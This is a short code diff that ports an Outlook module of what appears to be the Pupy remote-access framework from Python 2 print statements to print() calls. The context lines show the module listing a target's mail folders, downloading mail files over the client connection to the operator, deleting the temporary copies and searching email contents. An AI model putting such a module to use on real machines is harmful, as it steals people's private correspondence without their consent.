@@ -2,6 +2,7 @@
 #Author: @bobsecq
 #Contributor(s):
 
+from __future__ import print_function
 import os
 
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
@@ -73,9 +74,9 @@ class Outlook(PupyModule):
             self.success("Outlook folders and subfolders:")
             foldersAndSubFolders = outlook.getAllFolders()
             for i,folder in enumerate(foldersAndSubFolders):
-                print "{0}: {1}".format(i, folder.encode('utf-8'))
+                print("{0}: {1}".format(i, folder.encode('utf-8')))
                 for j,subFolder in enumerate(foldersAndSubFolders[folder]):
-                    print "  {0}.{1}: {2} (id: {3})".format(i, j, subFolder.encode('utf-8'), foldersAndSubFolders[folder][subFolder].encode('utf-8'))
+                    print("  {0}.{1}: {2} (id: {3})".format(i, j, subFolder.encode('utf-8'), foldersAndSubFolders[folder][subFolder].encode('utf-8')))
         if args.numberOfEmails:
             self.success("Trying to get number of emails in the {0} folder".format(args.outlookFolder))
             nb = outlook.getNbOfEmails()
@@ -99,7 +100,7 @@ class Outlook(PupyModule):
                     download(self.client.conn, aPathToMailFile, localPathToFile)
                     self.info("Deleting {0}".format(aPathToMailFile))
                     outlook.deleteTempMailFile(aPathToMailFile)
-                print "\n"
+                print("\n")
                 self.success("Download completed!")
         if args.search:
             self.success("Searching '{0}' in emails stored in {1} folder...".format(args.strings, args.outlookFolder))
